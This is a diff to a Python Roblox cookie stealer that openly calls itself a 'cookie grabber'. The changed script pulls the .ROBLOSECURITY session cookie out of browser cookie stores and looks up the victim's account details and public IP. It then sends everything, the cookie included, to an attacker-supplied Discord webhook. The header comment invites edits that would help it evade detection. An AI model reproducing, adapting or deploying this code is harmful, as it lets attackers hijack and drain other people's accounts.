@@ -1,4 +1,4 @@
-## Replace Webhook on Line 149
+## Replace Webhook on Line 148
 ## This is not meant to be undetected, make any changes you see fit for any performance boosts or reduced-detections, but, this is just a simple implementation of what is otherwise a dualhooked cookie grabber
 ## Enjoy!
 
@@ -10,12 +10,13 @@ except Exception as e:
 class SMTHGRB:
     def __init__(self, webhook: str):
         if not "discord.com/api/webhooks/" in webhook:
-            print('You did not provide a webhook on Line 149.'), exit()
+            print('You did not provide a webhook on Line 148.'), exit()
 
 
         self.webhook = webhook
         self.cookie = None
         self.platform = None
+        self.embeds = []
 
         self.browsers()
 
@@ -26,16 +27,19 @@ class SMTHGRB:
         user = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":self.cookie}).json()
         id = user['UserID']
 
-        self.info = f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{requests.get('https://api.ipify.org/').text}**||\n\nCookie:\n||```fix\n{self.cookie}```||"
+        self.embeds.append(
+            {
+                "title": f"✔ Valid Account - {self.platform}",
+                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{requests.get('https://api.ipify.org/').text}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
+                "color": 12452044,
+                "footer": {
+                    "text": "v2.2 ; Forked from Mani175's Cookie Grabber"
+                }
+            }
+        )
 
-        self.send()
         
-
-
     def browsers(self):
-
-        
-
         try:
             self.platform = "Firefox"
             for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
@@ -73,7 +77,6 @@ class SMTHGRB:
                 if cookie.name == '.ROBLOSECURITY':
                     self.cookie = cookie.value
                     self.checker()
-
 
         except:
             pass
@@ -128,22 +131,18 @@ class SMTHGRB:
         except:
             pass
 
-        
+        if len(self.embeds) == 0:
+            exit()
+
+        self.send()
 
     def send(self):
-        x = requests.post(self.webhook, json={
+        requests.post(self.webhook, json={
             "username": "ꜱᴏᴍᴇᴛʜɪɴɢ's .ROBLOSECURITY Grabber",
-            "embeds": [
-                {
-                    "title": f"✔ Valid Account - {self.platform}",
-                    "description": self.info,
-                    "color": 12452044,
-                    "footer": {
-                        "text": "v2.2 ; Forked from Mani175's Cookie Grabber"
-                    }
-                }
-            ]
+            "content": "@everyone", #You can change this to be just no ping or a @here ping.
+            "avatar_url": "https://cdn.discordapp.com/avatars/1095069808774619156/752d6e8299111d82cae5b9d7305b02ba.png?size=4096",
+            "embeds": self.embeds
         })
 
 
-SMTHGRB("%REPLACEWEBHOOK%")
+SMTHGRB("%WEBHOOKHERE%")
